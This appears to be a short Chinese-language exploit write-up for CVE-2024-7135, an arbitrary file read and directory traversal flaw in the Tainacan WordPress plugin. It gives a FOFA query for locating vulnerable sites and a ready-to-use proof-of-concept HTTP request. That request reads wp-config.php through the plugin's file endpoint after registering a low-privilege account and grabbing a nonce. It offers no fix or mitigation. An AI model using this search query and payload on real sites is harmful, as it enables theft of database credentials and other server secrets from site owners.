# WordPress插件Tainacan存在前台任意文件读取漏洞(CVE-2024-7135)

由于 0.21.7 之前（包括 0.21.7）的所有版本中缺少对“get_file”功能的功能检查，因此适用于 WordPress 的 Tainacan 插件容易受到未经授权的数据访问。该函数还容易受到目录遍历的攻击。这使得经过身份验证的攻击者（具有订阅者级别和更高级别访问权限）能够读取服务器上的任意文件的内容，这些文件可能包含敏感信息。

## fofa

```javascript
"wp-content/plugins/tainacan/"
```

## poc

首先要注册一个普通用户并登录，然后获取一下网站首页的Nonce，之后就可以直接读取了

```javascript
GET /wp-json/tainacan/v2/bg-processes/file?guid=../../../wp-config.php&_wpnonce=替换目标网站nonce HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Cookie: wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=57p45m6lctlfttfrsjfpk4fui9; wp_lang=zh_CN; wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=admin%7C1729391061%7ColYyhIIyEr3yA8JstL99jsKU6rCXsMPR8tQH6nNauzP%7C59e8715eb35b44ed9532e025052b7ef1748b384a9e03a39a9538cd4cd18ffdbe; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dhtml%26mfold%3Do; wp-settings-time-1=1729218262
Host: 127.0.0.1
```

![46a373971b5c0c4c637b280c889d2f91](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181624561.png)

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181624425.webp)